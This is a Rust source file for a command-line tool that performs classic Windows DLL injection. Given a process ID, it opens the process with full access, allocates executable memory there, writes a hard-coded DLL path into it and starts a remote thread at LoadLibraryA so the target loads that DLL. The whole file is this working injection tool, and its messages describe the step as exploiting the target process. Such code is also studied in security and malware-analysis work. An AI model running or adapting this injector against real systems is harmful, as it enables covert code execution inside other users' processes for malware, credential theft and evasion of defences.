use std::{env, ffi::c_void};

use windows::{
    core::*, 
    Win32::{
        Foundation::{
            GetLastError, HANDLE, HMODULE
        }, 
        System::{
            Diagnostics::Debug::WriteProcessMemory, 
            LibraryLoader::{
                GetModuleHandleA, 
                GetProcAddress}, 
            Memory::{
                VirtualAllocEx, 
                MEM_COMMIT, 
                MEM_RESERVE, 
                PAGE_EXECUTE_READWRITE
            }, Threading::{
                CreateRemoteThread, 
                OpenProcess, 
                WaitForSingleObject, 
                PROCESS_ALL_ACCESS
            }
        }
    }
};


// Some debugging macros
macro_rules! okay {
    ($($arg:tt)*) => {
        println!("[+] {}", format_args!($($arg)*));
    };
}
macro_rules! warn {
    ($($arg:tt)*) => {
        println!("[!] {}", format_args!($($arg)*));
    };
}
macro_rules! info {
    ($($arg:tt)*) => {
        println!("[-] {}", format_args!($($arg)*));
    };
}

fn make_thread(h_process: HANDLE) -> Result<HANDLE> {
    let path = "Z:\\r_inject_dll.dll";

    info!("Getting Kernel32.dll handle");
    let h_kernel32: HMODULE;
    unsafe {
        h_kernel32 = GetModuleHandleA(s!("kernel32"))?;
    }

    info!("Getting address of LoadLibraryA");
    let loadlib: unsafe extern "system" fn() -> isize;
    unsafe {
        loadlib = GetProcAddress(h_kernel32, s!("LoadLibraryA")).ok_or(GetLastError())?;
    }

    let addr: *mut c_void;
    unsafe { 
        addr = VirtualAllocEx(h_process, None, path.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    info!("Writing path to target process memory buffer");
    unsafe {
        WriteProcessMemory(h_process, addr, path.as_ptr() as *const c_void, path.len(), None)?;
    }

    info!("Creating remote thread in target process");
    let tid: Option<*mut u32> = Default::default();
    let h_thread: HANDLE;
    unsafe {
        h_thread = CreateRemoteThread(h_process, None, 0, Some(std::mem::transmute(loadlib)), Some(addr), 0, tid)?;
    }

    return Ok(h_thread);
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 2 || args[1].parse::<u32>().is_err() {
        warn!("Usage: {} <PID>", args[0]);
        return;
    }
    let pid: u32 = args[1].parse().unwrap();

    info!("Getting handle on target process {}", pid);
    let h_process: HANDLE = match unsafe{OpenProcess(PROCESS_ALL_ACCESS, false, pid)} {
        Ok(handle) => handle,
        Err(e) => {
            warn!("Failed to get handle on process, error: {:?}", e);
            return;
        }
    };
    
    let h_thread: HANDLE = match make_thread(h_process) {
        Ok(handle) => handle,
        Err(e) => {
            warn!("Failed to exploit target process, error: {:?}", e);
            return;
        }
    };

    info!("Waiting for thread to finish execution");
    unsafe {
        WaitForSingleObject(h_thread, core::u32::MAX);
    }
    okay!("Thread finished excecution, goodbye");
}